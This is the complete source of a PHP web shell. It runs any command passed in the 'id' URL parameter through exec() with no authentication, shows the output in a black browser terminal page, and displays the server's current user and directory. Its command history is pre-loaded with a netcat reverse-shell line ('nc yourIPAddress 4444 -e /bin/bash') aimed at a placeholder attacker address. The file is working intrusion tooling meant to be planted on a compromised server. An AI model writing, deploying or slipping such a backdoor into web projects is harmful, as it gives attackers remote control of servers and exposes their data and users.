<?php
	if(isset($_GET['id']))
	{
		$command = stripslashes($_GET['id']);
		exec($command . " 2>&1",$out);
		foreach($out as $o)
       		echo $o . "\n";
	}
	else
	{
?>
<html>
<head>
<title>PHP Shell</title>
<style>

body{background-color: black; }
.output{
 border: 0;
 color: white;
   background-color: black;
 width: 100%;
 height: 90%;
 padding:0px;
 margin:0px;
}
.input{
 color: white;
  background-color: black;
 width: 100%;
 height: 5%;
 padding:0px;
 margin:0px;
}
.info{
  border: 0;
  color:white;
  background-color: black;
  width: 100%;
  height: 5%;
 padding:0px;
 margin:0px;
}
.form1{
  padding:0px;
 margin:0px;
}
html,body{
 padding:0px;
 margin:0px;
}
p{ color:white; }
</style>

<script type="text/javascript">

http = new XMLHttpRequest();
var bash_history = new Array(10);
bash_history[0] = "nc yourIPAddress 4444 -e /bin/bash"
var history_newest = 0;
var history_oldest = 0;
var history_place = -1;
function submitform(myfield, e)
{
  var key;
  if(window.event)
    {
      key = window.event.keyCode;
    }
  else if(e) key = e.which;
  else return true;

  	if(key == 13)
  	{
		updateData(document.form1.input.value);
		document.form1.input.value="";
    	return false;
	}
	else if(key == 38) // Up Arrow
	{
		if(history_place != history_oldest)
		{
			//go up in history
			if(history_place == -1)
			{
				history_place = history_newest;
			}			
			else
			{
				history_place--;
				if(history_place == -1)
				{
					history_place += 10;
				}
			}
			document.form1.input.value = bash_history[history_place];
		}
		else
		{
			document.form1.input.value = bash_history[history_oldest];
		}
	
		return false;
	}
	else if(key == 40) // Down Arrow
	{
		if(history_place == -1 || history_newest == history_oldest || history_place == history_newest)
		{
			history_place = -1;
			document.form1.input.value = "";
		}
		else
		{
			history_place = (history_place + 1)%10;
			document.form1.input.value = bash_history[history_place];
		}
		return false;
	}
	else
	{
		return true;
	}
}

function updateData(param) 
{
	if(param == "")
	{
		return;
	}
	//manage bash_history
	
	history_newest = history_newest + 1;
	if(history_newest == 10)
	{
		history_newest = 0;
	}
	if(history_newest == history_oldest)
	{
		history_oldest = history_oldest + 1;
		if(history_oldest == 10)
		{
			history_oldest = 0;
		}
	}
	bash_history[history_newest] = param;
	history_place = -1;

	if(param == "clear")
	{
		document.form1.output.value = "";
		return;
  	}
  	
	document.form1.output.value+= "$: " + param + "\n";
	document.form1.output.scrollTop = document.form1.output.scrollHeight;
  	var myurl = "./shell.php";

	http.open("GET", myurl + "?id=" + escape(param), true);
	http.onreadystatechange = useHttpResponse;
	http.send(null);
  
}

function useHttpResponse() {
  if (http.readyState == 4) {
    var textout = http.responseText;
    document.form1.output.value+=textout;
    document.form1.output.scrollTop = document.form1.output.scrollHeight;
  }
}

</script>

</head>
<body onLoad="document.form1.input.focus(); document.form1.output.scrollTop = document.form1.output.scrollHeight" onKeyDown="return submitform(this, event)">
<form name="form1">
<textarea name="output" class="output" readonly=true>

</textarea>
<textarea name="input" class="input"></textarea>
</form>
<textarea name="info" class="info" readonly=true>
<? 
exec("whoami",$who); exec("pwd",$pwd);
echo "user: $who[0]\tlocation: $pwd[0]";
?>
</textarea>
<script>
document.form1.output.value="";
</script>
</body>
</html>
<?
	}
?>
